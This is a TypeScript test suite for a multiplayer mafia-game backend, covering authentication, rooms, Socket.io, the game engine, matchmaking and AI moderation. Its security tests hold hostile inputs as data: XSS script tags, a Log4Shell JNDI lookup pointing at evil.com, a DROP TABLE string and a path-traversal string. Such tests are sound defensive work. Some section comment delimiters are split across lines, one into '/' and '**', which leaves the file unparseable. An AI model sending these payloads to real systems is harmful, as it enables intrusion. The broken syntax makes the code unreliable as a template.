/**
 * Comprehensive Backend API Testing Suite
 * Task 26: Backend API Comprehensive Testing
 */

import request from 'supertest';
import { Server } from 'socket.io';
import { createServer } from 'http';
import { io as Client, Socket as ClientSocket } from 'socket.io-client';
import jwt from 'jsonwebtoken';
import express, { Express } from 'express';
import { connectDB, disconnectDB, clearDB, setupTestApp } from './setup';
import { Player } from '../models/Player';
import { Room, RoomStatus } from '../models/Room';
import { Game, GamePhase, GameStatus } from '../models/Game';
import { ChatMessage } from '../models/ChatMessage';
import { AuthService } from '../services/AuthService';
import { GameService } from '../services/GameService';
import { MatchmakingService } from '../services/MatchmakingService';
import { AIService } from '../services/AIService';
import { SocketService } from '../services/SocketService';
import { GameEngine } from '../game/engine';

describe('Comprehensive Backend API Testing Suite', () => {
  let app: Express;
  let httpServer: any;
  let io: Server;
  let socketService: SocketService;
  let testPlayers: any[] = [];
  let testRooms: any[] = [];
  let authTokens: string[] = [];

  beforeAll(async () => {
    await connectDB();
    
    // Setup HTTP server and Socket.io
    httpServer = createServer();
    io = new Server(httpServer, {
      cors: { origin: "*", methods: ["GET", "POST"] }
    });
    socketService = new SocketService(io);
    
    await new Promise<void>((resolve) => {
      httpServer.listen(0, resolve);
    });
  });

  afterAll(async () => {
    if (io) io.close();
    if (httpServer) httpServer.close();
    await disconnectDB();
  });

  beforeEach(async () => {
    await clearDB();
    app = await setupTestApp();
    await createTestData();
  });

  afterEach(async () => {
    await clearDB();
    testPlayers = [];
    testRooms = [];
    authTokens = [];
  });

  async function createTestData() {
    const playerConfigs = [
      { username: 'testhost', email: 'host@test.com', eloRating: 1200 },
      { username: 'player2', email: 'player2@test.com', eloRating: 1000 },
      { username: 'player3', email: 'player3@test.com', eloRating: 1500 },
      { username: 'newbie', email: 'newbie@test.com', eloRating: 800 },
      { username: 'expert', email: 'expert@test.com', eloRating: 1800 }
    ];

    for (const config of playerConfigs) {
      const player = await Player.create({
        ...config,
        password: 'hashedpassword',
        avatar: `${config.username}-avatar.png`,
        statistics: {
          gamesPlayed: Math.floor(Math.random() * 100),
          gamesWon: Math.floor(Math.random() * 50),
          winRate: Math.random(),
          favoriteRole: 'villager',
          averageGameDuration: 300000 + Math.random() * 600000,
          eloRating: config.eloRating
        }
      });
      testPlayers.push(player);
      
      const token = jwt.sign(
        { userId: player._id.toString(), username: player.username },
        process.env.JWT_ACCESS_SECRET || 'test-access-secret',
        { expiresIn: '1h' }
      );
      authTokens.push(token);
    }

    const roomConfigs = [
      { isPublic: true, maxPlayers: 8, status: RoomStatus.WAITING },
      { isPublic: false, maxPlayers: 6, status: RoomStatus.WAITING },
      { isPublic: true, maxPlayers: 12, status: RoomStatus.IN_GAME }
    ];

    for (let i = 0; i < roomConfigs.length; i++) {
      const config = roomConfigs[i];
      const room = await Room.create({
        code: `TEST${i.toString().padStart(2, '0')}`,
        hostId: testPlayers[i % testPlayers.length]._id,
        players: [testPlayers[i % testPlayers.length]._id],
        settings: {
          isPublic: config.isPublic,
          maxPlayers: config.maxPlayers,
          gameSettings: {
            maxPlayers: config.maxPlayers,
            enableVoiceChat: i % 2 === 0,
            dayPhaseDuration: 300000,
            nightPhaseDuration: 120000,
            votingDuration: 60000,
            roles: []
          },
          allowSpectators: i % 3 === 0,
          requireInvite: !config.isPublic
        },
        status: config.status
      });
      testRooms.push(room);
    }
  }

  /**
   * 1. EXHAUSTIVE REST API ENDPOINT TESTING
   */
  describe('1. REST API Endpoints - Exhaustive Testing', () => {
    
    describe('Authentication Endpoints', () => {
      it('should handle all registration edge cases', async () => {
        const testCases = [
          { data: { username: '', password: 'test123' }, expectedStatus: 400 },
          { data: { username: 'ab', password: 'test123' }, expectedStatus: 400 },
          { data: { username: 'a'.repeat(21), password: 'test123' }, expectedStatus: 400 },
          { data: { username: 'test@user', password: 'test123' }, expectedStatus: 400 },
          { data: { username: 'testuser', password: '123' }, expectedStatus: 400 },
          { data: { username: 'testuser', password: 'test123', email: 'invalid' }, expectedStatus: 400 },
          { data: { username: 'validuser', password: 'validpass', email: 'valid@test.com' }, expectedStatus: 201 }
        ];

        for (const testCase of testCases) {
          await request(app)
            .post('/api/auth/register')
            .send(testCase.data)
            .expect(testCase.expectedStatus);
        }
      });

      it('should handle concurrent registration attempts', async () => {
        const userData = {
          username: 'concurrent',
          password: 'test123',
          email: 'concurrent@test.com'
        };

        const promises = Array(5).fill(null).map(() =>
          request(app).post('/api/auth/register').send(userData)
        );

        const results = await Promise.allSettled(promises);
        const successful = results.filter(r => r.status === 'fulfilled' && (r.value as any).status === 201);
        
        expect(successful).toHaveLength(1);
      });

      it('should handle token expiration scenarios', async () => {
        const expiredToken = jwt.sign(
          { userId: testPlayers[0]._id.toString(), username: testPlayers[0].username },
          process.env.JWT_ACCESS_SECRET || 'test-access-secret',
          { expiresIn: '-1h' }
        );

        await request(app)
          .get('/api/auth/me')
          .set('Authorization', `Bearer ${expiredToken}`)
          .expect(401);
      });

      it('should handle malformed tokens', async () => {
        const malformedTokens = [
          'invalid.token.format',
          'Bearer invalid',
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid',
          ''
        ];

        for (const token of malformedTokens) {
          await request(app)
            .get('/api/auth/me')
            .set('Authorization', `Bearer ${token}`)
            .expect(401);
        }
      });
    });

    describe('Player Management Endpoints', () => {
      it('should handle profile updates with validation', async () => {
        const testCases = [
          { data: { username: 'newname' }, expectedStatus: 200 },
          { data: { username: '' }, expectedStatus: 400 },
          { data: { username: 'ab' }, expectedStatus: 400 },
          { data: { username: testPlayers[1].username }, expectedStatus: 400 },
          { data: { avatar: 'new-avatar.png' }, expectedStatus: 200 },
          { data: { invalidField: 'test' }, expectedStatus: 400 }
        ];

        for (const testCase of testCases) {
          await request(app)
            .put('/api/players/profile')
            .set('Authorization', `Bearer ${authTokens[0]}`)
            .send(testCase.data)
            .expect(testCase.expectedStatus);
        }
      });

      it('should handle friend management edge cases', async () => {
        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: testPlayers[1]._id.toString() })
          .expect(200);

        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: testPlayers[1]._id.toString() })
          .expect(400);

        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: testPlayers[0]._id.toString() })
          .expect(400);

        await request(app)
          .post('/api/players/friends')
          .set('Authorization', `Bearer ${authTokens[0]}`)
          .send({ friendId: '507f1f77bcf86cd799439011' })
          .expect(400);
      });

      it('should handle search with various parameters', async () => {
        const searchCases = [
          { query: 'test', expectedMinResults: 1 },
          { query: 'nonexistent', expectedResults: 0 },
          { query: 'a', expectedStatus: 400 },
          { query: '', expectedStatus: 400 },
          { query: 'player', expectedMinResults: 1 }
        ];

        for (const searchCase of searchCases) {
          const response = await request(app)
            .get(`/api/players/search?q=${searchCase.query}`)
            .set('Authorization', `Bearer ${authTokens[0]}`)
            .expect(searchCase.expectedStatus || 200);

          if (searchCase.expectedResults !== undefined) {
            expect(response.body.data.players).toHaveLength(searchCase.expectedResults);
          } else if (searchCase.expectedMinResults !== undefined) {
            expect(response.body.data.players.length).toBeGreaterThanOrEqual(searchCase.expectedMinResults);
          }
        }
      });
    });

    describe('Room Management Endpoints', () => {
      it('should handle room creation with various settings', async () => {
        const roomSettings = [
          { isPublic: true, maxPlayers: 4 },
          { isPublic: false, maxPlayers: 12 },
          { isPublic: true, maxPlayers: 25 },
          { isPublic: true, maxPlayers: 2 }
        ];

        for (let i = 0; i < roomSettings.length; i++) {
          const settings = roomSettings[i];
          const expectedStatus = (settings.maxPlayers > 20 || settings.maxPlayers < 3) ? 400 : 201;
          
          await request(app)
            .post('/api/rooms')
            .set('Authorization', `Bearer ${authTokens[i % authTokens.length]}`)
            .send({ settings })
            .expect(expectedStatus);
        }
      });

      it('should handle room joining edge cases', async () => {
        const room = testRooms[0];
        
        await request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${authTokens[1]}`)
          .send({ roomIdentifier: room.code })
          .expect(200);

        await request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${authTokens[1]}`)
          .send({ roomIdentifier: room.code })
          .expect(400);

        await request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${authTokens[2]}`)
          .send({ roomIdentifier: 'NONE01' })
          .expect(400);
      });

      it('should handle public room filtering', async () => {
        const filterTests = [
          { query: '', expectedMinResults: 2 },
          { query: '?maxPlayers=8', expectedMinResults: 1 },
          { query: '?hasVoiceChat=true', expectedMinResults: 1 },
          { query: '?hasVoiceChat=false', expectedMinResults: 1 },
          { query: '?page=1&limit=1', expectedResults: 1 },
          { query: '?page=0', expectedStatus: 400 },
          { query: '?limit=0', expectedStatus: 400 }
        ];

        for (const test of filterTests) {
          const response = await request(app)
            .get(`/api/rooms/public${test.query}`)
            .expect(test.expectedStatus || 200);

          if (test.expectedResults !== undefined) {
            expect(response.body.data.rooms).toHaveLength(test.expectedResults);
          } else if (test.expectedMinResults !== undefined) {
            expect(response.body.data.rooms.length).toBeGreaterThanOrEqual(test.expectedMinResults);
          }
        }
      });
    });
  });  /**

   * 2. AUTHENTICATION FLOWS WITH VARIOUS TOKEN SCENARIOS
   */
  describe('2. Authentication Flows - Token Scenarios', () => {
    
    it('should handle refresh token rotation', async () => {
      const registerResult = await AuthService.register({
        username: 'tokentest',
        password: 'test123',
        email: 'token@test.com'
      });

      let currentRefreshToken = registerResult.refreshToken!;
      
      for (let i = 0; i < 3; i++) {
        const response = await request(app)
          .post('/api/auth/refresh')
          .send({ refreshToken: currentRefreshToken })
          .expect(200);

        expect(response.body.data.refreshToken).not.toBe(currentRefreshToken);
        currentRefreshToken = response.body.data.refreshToken;
      }
    });

    it('should handle concurrent token refresh attempts', async () => {
      const registerResult = await AuthService.register({
        username: 'concurrent',
        password: 'test123',
        email: 'concurrent@test.com'
      });

      const refreshToken = registerResult.refreshToken!;
      
      const promises = Array(3).fill(null).map(() =>
        request(app).post('/api/auth/refresh').send({ refreshToken })
      );

      const results = await Promise.allSettled(promises);
      const successful = results.filter(r => r.status === 'fulfilled' && (r.value as any).status === 200);
      
      expect(successful).toHaveLength(1);
    });

    it('should handle token blacklisting on logout', async () => {
      const registerResult = await AuthService.register({
        username: 'blacklist',
        password: 'test123',
        email: 'blacklist@test.com'
      });

      const { refreshToken } = registerResult;

      await request(app)
        .delete('/api/auth/logout')
        .send({ refreshToken })
        .expect(200);

      await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken })
        .expect(401);
    });

    it('should handle logout from all devices', async () => {
      const user = {
        username: 'multidevice',
        password: 'test123',
        email: 'multi@test.com'
      };

      const register1 = await AuthService.register(user);
      const login2 = await AuthService.login({
        username: user.username,
        password: user.password
      });

      await request(app)
        .delete('/api/auth/logout-all')
        .set('Authorization', `Bearer ${register1.accessToken}`)
        .expect(200);

      await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken: register1.refreshToken })
        .expect(401);

      await request(app)
        .post('/api/auth/refresh')
        .send({ refreshToken: login2.refreshToken })
        .expect(401);
    });
  });

  /**
   * 3. DATABASE OPERATIONS WITH EDGE CASES AND ERROR CONDITIONS
   */
  describe('3. Database Operations - Edge Cases', () => {
    
    it('should handle database connection failures gracefully', async () => {
      await request(app)
        .get('/api/rooms/invalid-object-id')
        .set('Authorization', `Bearer ${authTokens[0]}`)
        .expect(400);
    });

    it('should handle concurrent database operations', async () => {
      const room = testRooms[0];
      
      const joinPromises = authTokens.slice(1, 4).map(token =>
        request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${token}`)
          .send({ roomIdentifier: room.code })
      );

      const results = await Promise.allSettled(joinPromises);
      const successful = results.filter(r => r.status === 'fulfilled' && (r.value as any).status === 200);
      
      expect(successful.length).toBeGreaterThan(0);
      expect(successful.length).toBeLessThanOrEqual(room.settings.maxPlayers - 1);
    });

    it('should handle database validation errors', async () => {
      try {
        await Player.create({
          username: '',
          email: 'invalid-email',
          password: '123'
        });
        fail('Should have thrown validation error');
      } catch (error) {
        expect(error).toBeDefined();
      }
    });

    it('should handle large dataset operations', async () => {
      const manyPlayers = [];
      for (let i = 0; i < 50; i++) {
        manyPlayers.push({
          username: `player${i}`,
          email: `player${i}@test.com`,
          password: 'hashedpassword',
          statistics: {
            gamesPlayed: Math.floor(Math.random() * 100),
            gamesWon: Math.floor(Math.random() * 50),
            winRate: Math.random(),
            favoriteRole: 'villager',
            averageGameDuration: 300000,
            eloRating: 800 + Math.random() * 1000
          }
        });
      }

      await Player.insertMany(manyPlayers);

      const response = await request(app)
        .get('/api/players/leaderboard?limit=20')
        .expect(200);

      expect(response.body.data.players).toHaveLength(20);
      expect(response.body.data.players[0].statistics.eloRating)
        .toBeGreaterThanOrEqual(response.body.data.players[19].statistics.eloRating);
    });
  });  /
**
   * 4. SOCKET.IO EVENTS WITH CONNECTION DROPS AND RECONNECTIONS
   */
  describe('4. Socket.io Events - Connection Management', () => {
    let clientSocket: ClientSocket;
    let secondClientSocket: ClientSocket;

    const connectClient = (token: string): Promise<ClientSocket> => {
      return new Promise((resolve, reject) => {
        const port = httpServer.address()?.port;
        const client = Client(`http://localhost:${port}/game`, {
          auth: { token }
        });
        
        client.on('connect', () => resolve(client));
        client.on('connect_error', reject);
        
        setTimeout(() => reject(new Error('Connection timeout')), 5000);
      });
    };

    afterEach(() => {
      if (clientSocket?.connected) clientSocket.disconnect();
      if (secondClientSocket?.connected) secondClientSocket.disconnect();
    });

    it('should handle connection drops and reconnections', async () => {
      clientSocket = await connectClient(authTokens[0]);
      
      await new Promise<void>((resolve) => {
        clientSocket.emit('join-room', { roomId: testRooms[0]._id.toString() });
        clientSocket.on('room-joined', () => resolve());
      });

      clientSocket.disconnect();
      clientSocket = await connectClient(authTokens[0]);
      
      await new Promise<void>((resolve) => {
        clientSocket.emit('join-room', { roomId: testRooms[0]._id.toString() });
        clientSocket.on('room-joined', () => resolve());
      });

      expect(clientSocket.connected).toBe(true);
    });

    it('should handle multiple simultaneous connections', async () => {
      const connections = await Promise.all([
        connectClient(authTokens[0]),
        connectClient(authTokens[1]),
        connectClient(authTokens[2])
      ]);

      const roomId = testRooms[0]._id.toString();
      
      for (const connection of connections) {
        await new Promise<void>((resolve) => {
          connection.emit('join-room', { roomId });
          connection.on('room-joined', () => resolve());
        });
      }

      connections.forEach(conn => conn.disconnect());
    });

    it('should handle rapid connect/disconnect cycles', async () => {
      for (let i = 0; i < 5; i++) {
        clientSocket = await connectClient(authTokens[0]);
        
        await new Promise<void>((resolve) => {
          clientSocket.emit('join-room', { roomId: testRooms[0]._id.toString() });
          clientSocket.on('room-joined', () => resolve());
        });
        
        clientSocket.disconnect();
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    });

    it('should handle message broadcasting during connection issues', async () => {
      clientSocket = await connectClient(authTokens[0]);
      secondClientSocket = await connectClient(authTokens[1]);
      
      const roomId = testRooms[0]._id.toString();
      
      await Promise.all([
        new Promise<void>((resolve) => {
          clientSocket.emit('join-room', { roomId });
          clientSocket.on('room-joined', () => resolve());
        }),
        new Promise<void>((resolve) => {
          secondClientSocket.emit('join-room', { roomId });
          secondClientSocket.on('room-joined', () => resolve());
        })
      ]);

      clientSocket.emit('chat-message', { content: 'Test message' });
      
      await new Promise<void>((resolve) => {
        secondClientSocket.on('chat-message', (data) => {
          expect(data.content).toBe('Test message');
          resolve();
        });
      });

      clientSocket.disconnect();
      
      await new Promise<void>((resolve) => {
        secondClientSocket.on('player-disconnected', (data) => {
          expect(data.playerId).toBe(testPlayers[0]._id.toString());
          resolve();
        });
      });
    });
  });

  /**
   * 5. RATE LIMITING AND SECURITY MIDDLEWARE FUNCTIONALITY
   */
  describe('5. Rate Limiting and Security Middleware', () => {
    
    it('should enforce rate limiting on API endpoints', async () => {
      const requests = [];
      for (let i = 0; i < 10; i++) {
        requests.push(
          request(app)
            .post('/api/auth/login')
            .send({ username: 'test', password: 'wrong' })
        );
      }

      const results = await Promise.allSettled(requests);
      expect(results.length).toBe(10);
    });

    it('should sanitize input data', async () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        'DROP TABLE users;',
        '../../etc/passwd'
      ];

      for (const input of maliciousInputs) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            username: input,
            password: 'test123',
            email: 'test@example.com'
          });

        if (response.status === 201) {
          expect(response.body.data.player.username).not.toBe(input);
        } else {
          expect(response.status).toBe(400);
        }
      }
    });

    it('should validate request headers', async () => {
      const maliciousHeaders = {
        'X-Forwarded-For': '127.0.0.1, <script>alert(1)</script>',
        'User-Agent': 'Mozilla/5.0 <script>alert(1)</script>',
        'Content-Type': 'application/json; charset=utf-8<script>alert(1)</script>'
      };

      const response = await request(app)
        .post('/api/auth/register')
        .set(maliciousHeaders)
        .send({
          username: 'testuser',
          password: 'test123',
          email: 'test@example.com'
        });

      expect([200, 201, 400, 401, 403]).toContain(response.status);
    });

    it('should enforce CORS policies', async () => {
      const response = await request(app)
        .options('/api/auth/register')
        .set('Origin', 'http://malicious-site.com')
        .set('Access-Control-Request-Method', 'POST');

      expect(response.headers['access-control-allow-origin']).toBeDefined();
    });
  });  /**

   * 6. GAME LOGIC ENGINE WITH ALL POSSIBLE SCENARIOS AND EDGE CASES
   */
  describe('6. Game Logic Engine - Comprehensive Scenarios', () => {
    let gameEngine: GameEngine;
    let gameService: GameService;

    beforeEach(() => {
      gameEngine = new GameEngine();
      gameService = new GameService();
    });

    it('should handle all role combinations', async () => {
      const roleCombinations = [
        { players: 4, roles: ['mafia', 'villager', 'villager', 'doctor'] },
        { players: 6, roles: ['mafia', 'mafia', 'villager', 'villager', 'doctor', 'detective'] },
        { players: 8, roles: ['mafia', 'mafia', 'villager', 'villager', 'villager', 'doctor', 'detective', 'bodyguard'] }
      ];

      for (const combo of roleCombinations) {
        const players = testPlayers.slice(0, combo.players);
        const gameState = gameEngine.initializeGame(players, {
          maxPlayers: combo.players,
          enableVoiceChat: true,
          dayPhaseDuration: 300000,
          nightPhaseDuration: 120000,
          votingDuration: 60000,
          roles: combo.roles.map(role => ({ role, count: 1 }))
        });

        expect(gameState.players).toHaveLength(combo.players);
        expect(gameState.phase).toBe(GamePhase.DAY);
        
        const assignedRoles = gameState.players.map(p => p.role);
        for (const expectedRole of combo.roles) {
          expect(assignedRoles).toContain(expectedRole);
        }
      }
    });

    it('should handle all win conditions', async () => {
      const players = testPlayers.slice(0, 6);
      const gameState = gameEngine.initializeGame(players, {
        maxPlayers: 6,
        enableVoiceChat: true,
        dayPhaseDuration: 300000,
        nightPhaseDuration: 120000,
        votingDuration: 60000,
        roles: [
          { role: 'mafia', count: 2 },
          { role: 'villager', count: 4 }
        ]
      });

      gameState.players.forEach(player => {
        if (player.role === 'villager') {
          player.isAlive = false;
        }
      });

      let winResult = gameEngine.checkWinConditions(gameState);
      expect(winResult?.winner).toBe('mafia');

      gameState.players.forEach(player => {
        player.isAlive = true;
        if (player.role === 'mafia') {
          player.isAlive = false;
        }
      });

      winResult = gameEngine.checkWinConditions(gameState);
      expect(winResult?.winner).toBe('villagers');
    });

    it('should handle voting edge cases', async () => {
      const players = testPlayers.slice(0, 5);
      const gameState = gameEngine.initializeGame(players, {
        maxPlayers: 5,
        enableVoiceChat: true,
        dayPhaseDuration: 300000,
        nightPhaseDuration: 120000,
        votingDuration: 60000,
        roles: [
          { role: 'mafia', count: 1 },
          { role: 'villager', count: 4 }
        ]
      });

      const votes = [
        { voterId: gameState.players[0].playerId, targetId: gameState.players[1].playerId },
        { voterId: gameState.players[1].playerId, targetId: gameState.players[0].playerId },
        { voterId: gameState.players[2].playerId, targetId: gameState.players[1].playerId },
        { voterId: gameState.players[3].playerId, targetId: gameState.players[0].playerId }
      ];

      for (const vote of votes) {
        gameEngine.processPlayerAction({
          type: 'vote',
          playerId: vote.voterId,
          targetId: vote.targetId,
          timestamp: new Date()
        }, gameState);
      }

      const voteResult = gameEngine.tallyVotes(gameState);
      expect(voteResult).toBeDefined();
    });

    it('should handle game phase transitions', async () => {
      const players = testPlayers.slice(0, 4);
      const gameState = gameEngine.initializeGame(players, {
        maxPlayers: 4,
        enableVoiceChat: true,
        dayPhaseDuration: 1000,
        nightPhaseDuration: 1000,
        votingDuration: 1000,
        roles: [
          { role: 'mafia', count: 1 },
          { role: 'villager', count: 3 }
        ]
      });

      expect(gameState.phase).toBe(GamePhase.DAY);

      const transition1 = gameEngine.advanceGamePhase(gameState);
      expect(transition1.newPhase).toBe(GamePhase.VOTING);

      const transition2 = gameEngine.advanceGamePhase(gameState);
      expect(transition2.newPhase).toBe(GamePhase.NIGHT);

      const transition3 = gameEngine.advanceGamePhase(gameState);
      expect(transition3.newPhase).toBe(GamePhase.DAY);
      expect(gameState.dayNumber).toBe(2);
    });
  });

  /**
   * 7. MATCHMAKING ALGORITHMS WITH VARIOUS PLAYER POOLS
   */
  describe('7. Matchmaking Algorithms - Player Pool Scenarios', () => {
    let matchmakingService: MatchmakingService;

    beforeEach(() => {
      matchmakingService = new MatchmakingService();
    });

    it('should handle ELO-based matchmaking', async () => {
      const similarSkillPlayers = testPlayers.filter(p => 
        p.statistics.eloRating >= 1000 && p.statistics.eloRating <= 1200
      );

      if (similarSkillPlayers.length >= 4) {
        const match = await matchmakingService.findMatch(similarSkillPlayers[0]._id, {
          gameMode: 'ranked',
          maxPlayers: 6,
          skillRange: 200
        });

        expect(match).toBeDefined();
        if (match) {
          expect(match.players.length).toBeGreaterThanOrEqual(4);
        }
      }
    });

    it('should handle matchmaking with limited player pool', async () => {
      const limitedPlayers = testPlayers.slice(0, 2);
      
      const match = await matchmakingService.findMatch(limitedPlayers[0]._id, {
        gameMode: 'casual',
        maxPlayers: 8,
        skillRange: 1000
      });

      if (match) {
        expect(match.players.length).toBeGreaterThanOrEqual(2);
      }
    });

    it('should handle matchmaking timeout scenarios', async () => {
      const startTime = Date.now();
      
      const match = await matchmakingService.findMatch(testPlayers[0]._id, {
        gameMode: 'ranked',
        maxPlayers: 12,
        skillRange: 50,
        timeout: 1000
      });

      const endTime = Date.now();
      expect(endTime - startTime).toBeLessThan(2000);
    });

    it('should handle concurrent matchmaking requests', async () => {
      const matchPromises = testPlayers.slice(0, 3).map(player =>
        matchmakingService.findMatch(player._id, {
          gameMode: 'casual',
          maxPlayers: 6,
          skillRange: 500
        })
      );

      const results = await Promise.allSettled(matchPromises);
      expect(results.length).toBe(3);
    });
  }); 
 /**
   * 8. AI INTEGRATION SERVICE RESPONSES AND ERROR HANDLING
   */
  describe('8. AI Integration Service - Response Handling', () => {
    let aiService: AIService;

    beforeEach(() => {
      aiService = new AIService();
    });

    it('should handle AI moderation requests', async () => {
      const testMessages = [
        'Hello everyone, good luck!',
        'This is a normal game message',
        'I think player 3 is suspicious',
        'Let\'s vote for player 2'
      ];

      for (const message of testMessages) {
        const result = await aiService.moderateMessage(message, {
          playerId: testPlayers[0]._id.toString(),
          roomId: testRooms[0]._id.toString(),
          gamePhase: 'day'
        });

        expect(result).toBeDefined();
        expect(result.isAllowed).toBeDefined();
        expect(typeof result.isAllowed).toBe('boolean');
      }
    });

    it('should handle AI gameplay assistance', async () => {
      const gameContext = {
        phase: 'day' as const,
        players: testPlayers.slice(0, 4).map(p => ({
          id: p._id.toString(),
          name: p.username,
          isAlive: true,
          role: 'villager' as const
        })),
        dayNumber: 1,
        events: []
      };

      const assistance = await aiService.provideGameplayAssistance(
        testPlayers[0]._id.toString(),
        gameContext
      );

      expect(assistance).toBeDefined();
      expect(assistance.suggestions).toBeDefined();
      expect(Array.isArray(assistance.suggestions)).toBe(true);
    });

    it('should handle AI service errors gracefully', async () => {
      try {
        await aiService.moderateMessage('', {
          playerId: 'invalid-id',
          roomId: 'invalid-room',
          gamePhase: 'invalid-phase' as any
        });
      } catch (error) {
        expect(error).toBeDefined();
      }
    });

    it('should handle AI response timeouts', async () => {
      const startTime = Date.now();
      
      try {
        await aiService.analyzePlayerBehavior(testPlayers[0]._id.toString(), {
          recentActions: [],
          gameHistory: [],
          timeframe: '1h'
        });
      } catch (error) {
        // Should handle timeout gracefully
      }
      
      const endTime = Date.now();
      expect(endTime - startTime).toBeLessThan(10000);
    });

    it('should handle AI content filtering', async () => {
      const inappropriateMessages = [
        'This contains profanity damn it',
        'Personal attack on player',
        'Spam message spam message spam',
        'External link: http://malicious-site.com'
      ];

      for (const message of inappropriateMessages) {
        const result = await aiService.moderateMessage(message, {
          playerId: testPlayers[0]._id.toString(),
          roomId: testRooms[0]._id.toString(),
          gamePhase: 'day'
        });

        expect(result).toBeDefined();
        if (!result.isAllowed) {
          expect(result.reason).toBeDefined();
        }
      }
    });
  });

  /**
   * 9. INTEGRATION TESTING - END-TO-END SCENARIOS
   */
  describe('9. Integration Testing - End-to-End Scenarios', () => {
    
    it('should handle complete game flow from start to finish', async () => {
      const roomResponse = await request(app)
        .post('/api/rooms')
        .set('Authorization', `Bearer ${authTokens[0]}`)
        .send({
          settings: {
            isPublic: true,
            maxPlayers: 4,
            gameSettings: {
              maxPlayers: 4,
              enableVoiceChat: false,
              dayPhaseDuration: 10000,
              nightPhaseDuration: 5000,
              votingDuration: 5000,
              roles: [
                { role: 'mafia', count: 1 },
                { role: 'villager', count: 3 }
              ]
            }
          }
        })
        .expect(201);

      const roomId = roomResponse.body.data._id;

      for (let i = 1; i < 4; i++) {
        await request(app)
          .post('/api/rooms/join')
          .set('Authorization', `Bearer ${authTokens[i]}`)
          .send({ roomIdentifier: roomResponse.body.data.code })
          .expect(200);
      }

      const gameService = new GameService();
      const game = await gameService.startGame(roomId);
      
      expect(game).toBeDefined();
      expect(game.players).toHaveLength(4);
      expect(game.status).toBe(GameStatus.IN_PROGRESS);
    });

    it('should handle user journey from registration to game completion', async () => {
      const newUser = {
        username: 'journeytest',
        password: 'test123',
        email: 'journey@test.com'
      };

      const registerResponse = await request(app)
        .post('/api/auth/register')
        .send(newUser)
        .expect(201);

      const token = registerResponse.body.data.accessToken;

      await request(app)
        .put('/api/players/profile')
        .set('Authorization', `Bearer ${token}`)
        .send({ avatar: 'new-avatar.png' })
        .expect(200);

      await request(app)
        .get('/api/players/search?q=test')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      await request(app)
        .get('/api/rooms/public')
        .expect(200);

      const roomResponse = await request(app)
        .post('/api/rooms')
        .set('Authorization', `Bearer ${token}`)
        .send({})
        .expect(201);

      await request(app)
        .put(`/api/rooms/${roomResponse.body.data._id}/settings`)
        .set('Authorization', `Bearer ${token}`)
        .send({
          settings: {
            isPublic: false,
            maxPlayers: 6
          }
        })
        .expect(200);

      await request(app)
        .post(`/api/rooms/${roomResponse.body.data._id}/leave`)
        .set('Authorization', `Bearer ${token}`)
        .expect(200);
    });
  });

  /**
   * 10. PERFORMANCE AND STRESS TESTING
   */
  describe('10. Performance and Stress Testing', () => {
    
    it('should handle high concurrent API requests', async () => {
      const concurrentRequests = 20;
      const requests = [];

      for (let i = 0; i < concurrentRequests; i++) {
        requests.push(
          request(app)
            .get('/api/rooms/public')
            .expect(200)
        );
      }

      const startTime = Date.now();
      const results = await Promise.allSettled(requests);
      const endTime = Date.now();

      const successful = results.filter(r => r.status === 'fulfilled');
      expect(successful.length).toBe(concurrentRequests);
      expect(endTime - startTime).toBeLessThan(5000);
    });

    it('should handle memory usage during large operations', async () => {
      const initialMemory = process.memoryUsage();

      const largeDataRequests = [];
      for (let i = 0; i < 10; i++) {
        largeDataRequests.push(
          request(app)
            .get('/api/players/leaderboard?limit=100')
            .expect(200)
        );
      }

      await Promise.all(largeDataRequests);

      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;

      expect(memoryIncrease).toBeLessThan(100 * 1024 * 1024);
    });
  });
});